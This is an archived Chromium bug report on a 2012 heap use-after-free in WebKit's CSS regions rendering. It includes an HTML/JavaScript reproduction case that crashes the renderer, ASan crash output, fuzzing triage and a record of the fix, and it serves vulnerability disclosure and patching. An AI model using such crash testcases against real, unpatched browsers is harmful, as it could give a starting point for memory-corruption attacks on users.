# Heap-use-after-free in WebCore::RenderRegion::setRegionBoxesRegionStyle

| Field | Value |
|-------|-------|
| **Issue ID** | [40053162](https://issues.chromium.org/issues/40053162) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Blink |
| **Reporter** | mi...@gmail.com |
| **Assignee** | mo...@google.com |
| **Created** | 2012-01-31 |
| **Bounty** | $1,000.00 |

## Description

**VULNERABILITY DETAILS**  

heap use-after-free with regions

**VERSION**  

Chrome Version:

Chromium 18.0.1024.0 (Developer Build 119801)  

OS Linux  

WebKit 535.19 (@106291)

Operating System: linux 64bit

**REPRODUCTION CASE**

<html>
<head>
<style>
#el1 {
display: table-row;
-webkit-flow-into: A;
}
#el3 {
-webkit-flow-from: A;
}
</style>
<script>
onload = function() {
el1=document.createElement('div')
el1.setAttribute('id','el1')
document.body.appendChild(el1)
el2=document.createElement('div')
document.body.appendChild(el2)
el3=document.createElement('hr')
el3.setAttribute('id','el3')
el2.appendChild(el3)
el4=document.createElement('select')
el1.appendChild(el4)
el4.style.display='block'
setTimeout(function() {
el4.style.display='table-cell'
},0)
}
</script>
</head>
<body>
</body>
</html>

**FOR CRASHES, PLEASE INCLUDE THE FOLLOWING ADDITIONAL INFORMATION**  

Type of crash: renderer + asan  

Crash State:

==3922== ERROR: AddressSanitizer heap-use-after-free on address 0x7fffecc32880 at pc 0x55555ad3532c bp 0x7fffffff6090 sp 0x7fffffff6088  

READ of size 8 at 0x7fffecc32880 thread T0  

#0 0x55555ad3532c in WebCore::RenderRegion::setRegionBoxesRegionStyle() ???:0

0x7fffecc32880 is located 0 bytes inside of 248-byte region [0x7fffecc32880,0x7fffecc32978)  

freed by thread T0 here:  

#0 0x55555d953342 in free ??:0  

#1 0x5555598f1f1c in WebCore::Node::detach() ???:0  

#2 0x5555598b57c5 in WebCore::Element::detach() ???:0

## Attachments

- [regions.html](attachments/regions.html) (text/html; charset=us-ascii, 771 B)
- [asan-regions.txt](attachments/asan-regions.txt) (text/x-c; charset=us-ascii, 10.4 KB)

## Timeline

### pa...@chromium.org (2012-01-31)

Does not affect 17 beta on my Mac, but does repro on ToT. It's running in clusterfuzz now.

### pa...@google.com (2012-01-31)

Detailed report: https://cluster-fuzz.appspot.com/testcase?key=17145350

Uploader: palmer@chromium.org

Crash Type: Heap-use-after-free READ 8
Crash Address: 0x7f2b8990d880
Crash State:
  - crash stack -
  WebCore::RenderRegion::setRegionBoxesRegionStyle
  WebCore::RenderRegion::paintReplaced
  - free stack -
  WebCore::Node::detach
  WebCore::Element::detach
  

Unminimized Testcase: https://cluster-fuzz.appspot.com/download/AMIfv96tUGKCkrozrEKHVEAWfuYAQKpapV0fx2RlSIDTWK5cy6rmMN8aLfOxkD0TJQj-AscQPsnNdu36vMlYvEaCIrGqoqdcHBQMJkfieJx1ekK50pDJCKf_j0_2VIy0Jpvq-veO9Irx9zu28zEGYnM-VCqAh-GfVw

### pa...@chromium.org (2012-01-31)

Upstreamed: https://bugs.webkit.org/show_bug.cgi?id=77474

### in...@chromium.org (2012-02-01)

We updated the bug early, here is regression range from CluterFuzz - https://cluster-fuzz.appspot.com/revisions?range=119777:119801. My comments will be short becuase i am just able to type with left hand.

### in...@chromium.org (2012-02-03)

Yipee! mihnea has patch upstream!

### in...@chromium.org (2012-02-04)

http://trac.webkit.org/changeset/106694, m18 branched, needs merging.

### sc...@gmail.com (2012-02-10)

Merged to M18: http://trac.webkit.org/changeset/107303

### sc...@gmail.com (2012-02-11)

Bye bye regression! $1000

### sc...@gmail.com (2012-03-28)

[Empty comment from Monorail migration]

### bu...@chromium.org (2012-10-13)

This issue has been closed for some time. No one will pay attention to new comments.
If you are seeing this bug or have new data, please click New Issue to start a new bug.

### bu...@chromium.org (2013-03-10)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-13)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-13)

[Empty comment from Monorail migration]

### sc...@gmail.com (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-04-01)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-04-06)

[Empty comment from Monorail migration]

### sh...@chromium.org (2016-10-01)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### sh...@chromium.org (2016-10-02)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### mb...@chromium.org (2016-10-02)

[Empty comment from Monorail migration]

### is...@google.com (2016-10-02)

This issue was migrated from crbug.com/chromium/112151?no_tracker_redirect=1

[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40053162)*
